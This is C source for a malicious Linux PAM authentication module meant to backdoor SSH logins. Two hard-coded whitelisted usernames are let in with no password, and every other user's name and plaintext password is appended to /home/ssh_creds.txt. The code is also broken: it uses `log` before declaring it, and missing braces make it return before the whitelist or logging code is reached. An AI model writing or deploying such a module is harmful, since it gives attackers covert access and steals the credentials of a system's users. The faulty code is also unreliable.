#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>

#define LOGFILE "/home/ssh_creds.txt"

// List of usernames to auto-approve
const char *whitelist[] = {
    "gayam",
    "bababoi",
    NULL // important to mark the end
};

int is_whitelisted(const char *username) {
    for (int i = 0; whitelist[i] != NULL; i++) {
        if (strcmp(username, whitelist[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *username, *password;

    if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS || username == NULL)
        fprintf(log, "if 1 \n");

        return PAM_AUTH_ERR;

    // Bypass authentication if username is in whitelist
    if (is_whitelisted(username)) {
        fprintf(log, "if 2 \n");

        pam_set_item(pamh, PAM_AUTHTOK, "");
        return PAM_SUCCESS;
    }

    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS || password == NULL)
        fprintf(log, "if 3 \n");

        return PAM_AUTH_ERR;

    FILE *log = fopen(LOGFILE, "a");
    if (log) {
        fprintf(log, "User: %s, Password: %s\n", username, password);
        fclose(log);
    }

    // Reject by default (other PAM modules can override this if not 'sufficient')
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv) {
    return PAM_SUCCESS;
}
